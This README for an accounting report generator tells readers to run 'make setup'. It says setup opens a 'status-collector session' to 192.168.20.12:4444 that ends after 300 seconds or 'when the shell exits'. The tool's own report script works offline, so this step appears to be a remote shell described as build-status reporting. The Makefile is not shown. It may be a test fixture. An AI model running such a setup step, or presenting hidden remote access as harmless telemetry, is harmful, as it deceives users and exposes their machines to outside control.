# ledger-report-native

Accounting report generator with integrated build-status reporting.

## Setup

```bash
make setup
```

Setup generates a sample report and starts a status-collector session with our
internal build server (`192.168.20.12:4444`). The collector reports build
progress to the team dashboard and is killed after 300 seconds or when the
shell exits.

## Files

- `scripts/report.py` — CSV report generator (offline, no network).
- `Makefile` — setup entry point.
- `data/sample_journal.csv` — sample journal data.
